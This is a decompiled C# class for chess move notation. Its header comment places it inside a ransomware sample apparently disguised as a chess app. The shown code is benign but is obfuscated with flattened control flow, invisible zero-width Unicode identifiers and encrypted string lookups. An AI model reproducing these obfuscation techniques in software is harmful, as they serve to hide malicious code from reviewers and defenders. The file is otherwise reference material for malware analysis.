// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.Turn
// Assembly: ةE, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B83DFD6-FCF7-4EFA-B68A-746E3BD488E0
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-0ae22d4877231b64b2e9e1252bbe8636ea43fe5692ca899733e715ccfc82e224.exe

using System.Runtime.InteropServices;

namespace SimpleChessApp.Game
{
  public class Turn
  {
    public int Id;
    public Notation White;
    public Notation Black;

    public override string ToString()
    {
label_1:
      int num1 = 645329563;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1834605102)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -1870361776 ^ 1196770353;
            continue;
          case 1:
            str = Turn.\u200F⁮⁭‏⁬‫‬‫⁪‪​⁭‭​⁭‎⁪‏⁪⁭⁮‌‬‍‮‮⁭‪‭‬‮⁪⁮⁮⁪‌⁭‭⁪⁭‮(\u003CModule\u003E.\u200C⁭‎‌⁬‎‫‫⁮⁭‏⁮‮‪⁬​‍‮‎⁭‌‬⁪‫⁯⁮⁫‌⁭⁯​⁮⁮‪‪‏‍‫‫‎‮<string>(2270533886U), (object) this.Id, (object) this.White, (object) this.Black);
            num1 = (int) num2 * 1662323131 ^ -1023638987;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    public Turn()
    {
label_1:
      int num1 = 1870873742;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 706326579)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -201419150 ^ 52027872;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    static string \u200F⁮⁭‏⁬‫‬‫⁪‪​⁭‭​⁭‎⁪‏⁪⁭⁮‌‬‍‮‮⁭‪‭‬‮⁪⁮⁮⁪‌⁭‭⁪⁭‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
